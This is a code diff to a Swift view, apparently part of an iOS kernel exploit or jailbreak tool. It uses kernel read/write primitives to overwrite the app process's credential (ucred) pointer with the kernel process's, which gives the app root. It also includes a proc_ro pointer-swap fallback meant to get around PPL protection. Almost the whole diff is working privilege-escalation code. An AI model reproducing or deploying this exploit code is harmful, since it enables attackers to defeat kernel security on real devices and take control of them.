@@ -331,21 +331,40 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         // and restore immediately if something goes wrong
         // ============================================================
         
-        // --- TEST A: Can we write to proc_ro ucred field? ---
+        // --- TEST A: Can we write DIFFERENT value to proc_ro ucred field? ---
         report += "=== TEST A: Write to proc_ro ucred field ===\n"
         let origUcredPtr = ds_kread64(ucredAddr)
-        ds_kwrite64(ucredAddr, origUcredPtr)  // Write same value (safe)
+        // Write a DIFFERENT value to truly test (use kernel ucred as test)
+        let kernProc0 = procbypid(0)
+        let kernProcRo0 = ds_kread64(kernProc0 + UInt64(off_proc_p_proc_ro))
+        let kernUcred0 = ds_kread64(kernProcRo0 + UInt64(off_proc_ro_p_ucred))
+        
+        ds_kwrite64(ucredAddr, kernUcred0)  // Try write kernel ucred ptr
         let verifyA = ds_kread64(ucredAddr)
-        let procRoWritable = (verifyA == origUcredPtr)
-        report += String(format: "proc_ro ucred field: %@\n", procRoWritable ? "WRITABLE ✅" : "BLOCKED ❌")
+        let procRoWritable = (verifyA == kernUcred0)
+        
+        if procRoWritable {
+            // It actually worked! Check getuid
+            let testUid = getuid()
+            report += String(format: "proc_ro ucred field: TRULY WRITABLE ✅\n")
+            report += String(format: "getuid() = %d\n", testUid)
+            if testUid == 0 {
+                report += "\n🎉🎉🎉 ROOT ACHIEVED! 🎉🎉🎉\n"
+                rootResult = report
+                return
+            }
+            // Restore if getuid didn't change
+            ds_kwrite64(ucredAddr, origUcredPtr)
+            report += "Restored (getuid didn't reflect change)\n\n"
+        } else {
+            report += String(format: "proc_ro ucred field: PPL BLOCKED ❌\n")
+            report += String(format: "(wrote 0x%llx, read back 0x%llx)\n\n", kernUcred0, verifyA)
+        }
         
         if !procRoWritable {
-            // proc_ro is PPL protected too
-            report += "\nproc_ro content is PPL-protected.\n"
-            report += "Trying proc_ro pointer swap instead...\n\n"
-            
-            // --- TEST B: Verify proc_ro pointer is writable (we know this works) ---
-            report += "=== TEST B: proc_ro pointer swap ===\n"
+            // proc_ro is PPL protected — use proc_ro pointer swap
+            report += "=== TEST B: proc_ro POINTER swap ===\n"
+            report += "(proc_ro content is PPL-protected, but pointer in proc is not)\n\n"
             
             // We need safe heap memory for fake structures.
             // Use rw_socket_pcb + 0x200 area (after the icmp6 filter data)
@@ -366,15 +385,9 @@ struct BleedingEdgeIOSurfaceKRWView: View {
             // We'll point it to kernel_proc's ucred (uid=0)
             
             report += "Looking for kernel_proc (pid=0) ucred...\n"
-            let kernProc = procbypid(0)
-            guard kernProc != 0 else {
-                report += "❌ kernel proc not found\n"
-                rootResult = report
-                return
-            }
-            
-            let kernProcRo = ds_kread64(kernProc + UInt64(off_proc_p_proc_ro))
-            let kernUcred = ds_kread64(kernProcRo + UInt64(off_proc_ro_p_ucred))
+            let kernProc = kernProc0
+            let kernProcRo = kernProcRo0
+            let kernUcred = kernUcred0
             let kernUid = ds_kread32(kernUcred + 0x18)
             
             report += String(format: "kernel proc:    0x%llx\n", kernProc)
@@ -414,32 +427,8 @@ struct BleedingEdgeIOSurfaceKRWView: View {
                 report += "Restored original proc_ro.\n"
             }
         } else {
-            // proc_ro IS writable! Even easier path
-            report += "\n=== DIRECT UCRED SWAP ===\n"
-            
-            // Point our ucred to kernel's ucred
-            let kernProc = procbypid(0)
-            let kernProcRo = ds_kread64(kernProc + UInt64(off_proc_p_proc_ro))
-            let kernUcred = ds_kread64(kernProcRo + UInt64(off_proc_ro_p_ucred))
-            
-            report += String(format: "Kernel ucred: 0x%llx\n", kernUcred)
-            report += "Swapping ucred pointer...\n"
-            
-            ds_kwrite64(ucredAddr, kernUcred)
-            
-            let verify = ds_kread64(ucredAddr)
-            let realUid = getuid()
-            
-            report += String(format: "New ucred ptr: 0x%llx\n", verify)
-            report += String(format: "getuid(): %d\n\n", realUid)
-            
-            if realUid == 0 {
-                report += "🎉🎉🎉 ROOT ACHIEVED! 🎉🎉🎉\n"
-            } else {
-                report += "❌ PPL blocked ucred pointer write in proc_ro\n"
-                ds_kwrite64(ucredAddr, ucred)  // Restore
-                report += "Restored.\n"
-            }
+            // proc_ro IS writable — already handled above in Test A
+            report += "Already handled in Test A above.\n"
         }
         
         rootResult = report
